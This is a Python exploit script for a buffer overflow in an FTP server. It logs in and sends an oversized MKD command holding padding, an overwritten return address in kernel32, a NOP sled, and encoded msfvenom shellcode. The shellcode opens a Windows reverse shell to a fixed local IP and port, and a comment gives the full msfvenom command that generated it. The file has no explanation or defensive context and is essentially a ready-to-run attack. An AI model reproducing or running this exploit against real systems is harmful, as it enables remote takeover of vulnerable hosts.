#!/usr/bin/python
import sys
import socket

# eip 77E9F8F7 kernel32 dll
# bad \x00\x0A\x0D

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=9696 -f python -b \x00\x0A\x0D --platform windows -a x86 -e x86/shikata_ga_nai EXITFUNC=thread


buf =  ""
buf += "\xda\xd4\xd9\x74\x24\xf4\xbf\x2c\xc2\x29\xf1\x5d\x29"
buf += "\xc9\xb1\x52\x31\x7d\x17\x83\xc5\x04\x03\x51\xd1\xcb"
buf += "\x04\x55\x3d\x89\xe7\xa5\xbe\xee\x6e\x40\x8f\x2e\x14"
buf += "\x01\xa0\x9e\x5e\x47\x4d\x54\x32\x73\xc6\x18\x9b\x74"
buf += "\x6f\x96\xfd\xbb\x70\x8b\x3e\xda\xf2\xd6\x12\x3c\xca"
buf += "\x18\x67\x3d\x0b\x44\x8a\x6f\xc4\x02\x39\x9f\x61\x5e"
buf += "\x82\x14\x39\x4e\x82\xc9\x8a\x71\xa3\x5c\x80\x2b\x63"
buf += "\x5f\x45\x40\x2a\x47\x8a\x6d\xe4\xfc\x78\x19\xf7\xd4"
buf += "\xb0\xe2\x54\x19\x7d\x11\xa4\x5e\xba\xca\xd3\x96\xb8"
buf += "\x77\xe4\x6d\xc2\xa3\x61\x75\x64\x27\xd1\x51\x94\xe4"
buf += "\x84\x12\x9a\x41\xc2\x7c\xbf\x54\x07\xf7\xbb\xdd\xa6"
buf += "\xd7\x4d\xa5\x8c\xf3\x16\x7d\xac\xa2\xf2\xd0\xd1\xb4"
buf += "\x5c\x8c\x77\xbf\x71\xd9\x05\xe2\x1d\x2e\x24\x1c\xde"
buf += "\x38\x3f\x6f\xec\xe7\xeb\xe7\x5c\x6f\x32\xf0\xa3\x5a"
buf += "\x82\x6e\x5a\x65\xf3\xa7\x99\x31\xa3\xdf\x08\x3a\x28"
buf += "\x1f\xb4\xef\xff\x4f\x1a\x40\x40\x3f\xda\x30\x28\x55"
buf += "\xd5\x6f\x48\x56\x3f\x18\xe3\xad\xa8\xe7\x5c\xac\x21"
buf += "\x80\x9e\xae\x14\xb0\x16\x48\x3c\x20\x7f\xc3\xa9\xd9"
buf += "\xda\x9f\x48\x25\xf1\xda\x4b\xad\xf6\x1b\x05\x46\x72"
buf += "\x0f\xf2\xa6\xc9\x6d\x55\xb8\xe7\x19\x39\x2b\x6c\xd9"
buf += "\x34\x50\x3b\x8e\x11\xa6\x32\x5a\x8c\x91\xec\x78\x4d"
buf += "\x47\xd6\x38\x8a\xb4\xd9\xc1\x5f\x80\xfd\xd1\x99\x09"
buf += "\xba\x85\x75\x5c\x14\x73\x30\x36\xd6\x2d\xea\xe5\xb0"
buf += "\xb9\x6b\xc6\x02\xbf\x73\x03\xf5\x5f\xc5\xfa\x40\x60"
buf += "\xea\x6a\x45\x19\x16\x0b\xaa\xf0\x92\x2b\x49\xd0\xee"
buf += "\xc3\xd4\xb1\x52\x8e\xe6\x6c\x90\xb7\x64\x84\x69\x4c"
buf += "\x74\xed\x6c\x08\x32\x1e\x1d\x01\xd7\x20\xb2\x22\xf2"


buffer = "A"*247
buffer += "\xF7\xF8\xE9\x77"
buffer += "\x90" * 30
buffer += buf

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.1.10',21))

s.recv(1024)
s.send('USER kalisa\r\n')
s.recv(1024)
s.send('PASS kalisa\r\n')
s.recv(1024)
s.send('MKD '+buffer+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close()
